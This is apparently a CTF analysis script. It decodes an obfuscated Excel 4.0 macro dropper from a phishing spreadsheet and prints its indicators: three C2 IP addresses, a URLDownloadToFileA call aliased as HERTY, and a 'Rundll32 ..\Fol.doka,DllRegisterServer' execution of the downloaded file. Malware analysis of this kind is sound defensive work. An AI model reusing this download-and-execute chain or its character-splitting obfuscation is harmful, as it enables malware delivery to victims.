"""Reconstruct the XLM macro payload from the Phishtofortune spreadsheet."""

# Shared strings (0-indexed)
SS = {0:'R', 1:'L', 2:'M', 3:'o', 4:'n', 5:'D', 6:'w', 7:'l', 8:'a', 9:'d', 
      10:'T', 11:'F', 12:'i', 13:'e', 14:'J', 15:'C', 16:'B', 17:'HERTY', 18:'A',
      19:'http://', 20:'188.127.227.99/', 21:'45.150.67.29/'}

# Cell references from sheet1.xml:
# AH87 = SS[19] = "http://"
# AL99 = SS[0] = "R"
# AL100 = SS[1] = "L"
# AL101 = SS[5] = "D"
# AL102 = SS[3] = "o"
# AL103 = SS[6] = "w"
# AL104 = SS[4] = "n"
# AL105 = SS[7] = "l"   AK105 = SS[14] = "J"
# AL106 = SS[3] = "o"   AK106 = SS[14] = "J"
# AL107 = SS[8] = "a"   AK107 = SS[15] = "C"
# AL108 = SS[9] = "d"   AK108 = SS[15] = "C"
# AL109 = SS[10] = "T"  AK109 = SS[16] = "B"
# AL110 = SS[3] = "o"   AK110 = SS[16] = "B"
# AL111 = SS[11] = "F"
# AL112 = SS[12] = "i"  AK112 = SS[17] = "HERTY"
# AL113 = SS[7] = "l"
# AL114 = SS[13] = "e"
# AL115 = SS[18] = "A"
# AK117 = SS[2] = "M"
# Z400 = SS[20] = "188.127.227.99/"
# Z401 = SS[21] = "45.150.67.29/"
# Z402 = formula "195.123.213.126/"
# AO262 = NOW()&".dat" = "<timestamp>.dat"

# FORMULA.FILL at AO265:
# ","&AL101&AL113&AL113&AL99&AL114&"g"&"i"&"s"&"t"&"e"&"r"&"S"&"e"&"r"&"v"&"e"&"r"
# = "," & "D" & "l" & "l" & "R" & "e" & "gisterServer"
# = ",DllRegisterServer"
formula_fill_265 = ",DllRegisterServer"
print(f"AP265 (FORMULA.FILL) = {formula_fill_265}")

# REGISTER at AO271:
# DLL: "U" & AL99 & AL100 & AK117 & AL110 & AL104
#     = "U" & "R" & "L" & "M" & "o" & "n"
#     = "URLMon"
dll_name = "U" + "R" + "L" + "M" + "o" + "n"
print(f"DLL = {dll_name}")

# Function: "U" & AL99..AL115 (all the AL cells in order)
# = "U" + "R" + "L" + "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "T" + "o" + "F" + "i" + "l" + "e" + "A"
func_name = "U" + "R" + "L" + "D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "T" + "o" + "F" + "i" + "l" + "e" + "A"
print(f"Function = {func_name}")

# Types: AK105&AK106&AK107&AK108&AK109&AK110
# = "J" + "J" + "C" + "C" + "B" + "B"
types = "J" + "J" + "C" + "C" + "B" + "B"
print(f"Types = {types}")

# Alias: AK112 = "HERTY"
print(f"Alias = HERTY")

# HERTY calls (URLDownloadToFileA):
# HERTY(0, AH87 & Z400 & AO262, "..\Fol.doka", 0, 0)
# = HERTY(0, "http://" & "188.127.227.99/" & "<ts>.dat", "..\Fol.doka", 0, 0)
urls = [
    "http://188.127.227.99/<ts>.dat",
    "http://45.150.67.29/<ts>.dat", 
    "http://195.123.213.126/<ts>.dat"
]
print("\nC2 URLs:")
for u in urls: print(f"  {u}")

# sheet2: EXEC calls
# Y211 = "R" + "u" + "n" + "d" + "l" + "l" + "3" + "2 "
exec_cmd = "Rundll32 "
print(f"\nExec prefix = '{exec_cmd}'")
# EXEC(Y211 & "..\Fol.doka" & AP265)
# = "Rundll32 ..\Fol.doka,DllRegisterServer"
for fn in ["..\Fol.doka","..\Fol.doka1","..\Fol.doka2"]:
    print(f"EXEC: {exec_cmd}{fn}{formula_fill_265}")

# The IPs: 188.127.227.99, 45.150.67.29, 195.123.213.126
# This is a known LemonDuck sample.
print("\n=== Summary of IoCs ===")
print("C2 IPs: 188.127.227.99, 45.150.67.29, 195.123.213.126")
print("DLL: URLMon (URLDownloadToFileA)")
print("Payload files: Fol.doka, Fol.doka1, Fol.doka2")
print("Execution: Rundll32 ..\Fol.doka,DllRegisterServer")

# Challenge says "sometimes the strings tell the whole story" 
# Flag format FLAG{} — let me look at ALL strings, including the workbook, docProps
# Check the core.xml and app.xml for hidden metadata
import os
base = r'c:\Users\mayan\OneDrive\Desktop\ctf\Phishtofortune\Phishtofortune\Phishtofortune'
for root, dirs, files in os.walk(base):
    for f in files:
        if f.endswith('.xml') or f.endswith('.rels'):
            fp = os.path.join(root, f)
            txt = open(fp, 'r', encoding='utf-8', errors='ignore').read()
            if 'flag' in txt.lower() or 'FLAG' in txt or 'RkxBR' in txt:
                print(f"\n*** FLAG reference in {f}: ***")
                # show context
                import re
                for m in re.finditer(r'(?i)flag|RkxBR', txt):
                    start = max(0, m.start()-50)
                    print(txt[start:m.end()+100])
